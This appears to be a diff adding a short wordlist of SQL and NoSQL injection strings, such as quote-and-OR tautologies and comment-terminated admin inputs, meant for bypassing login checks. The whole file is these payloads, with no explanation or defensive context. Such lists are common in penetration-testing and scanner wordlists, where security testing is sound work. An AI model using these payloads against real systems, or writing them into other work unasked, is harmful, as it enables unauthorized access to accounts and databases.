@@ -1,0 +1,10 @@
+1' or '1' = '1
+1" or "1" = "1
+admin'; -- 
+admin"; -- 
+'; return '' == '
+' OR '2'='2' /*
+" or ""="
+1 OR 1=1
+admin') or ('1'='1
+admin") or ("1"="1
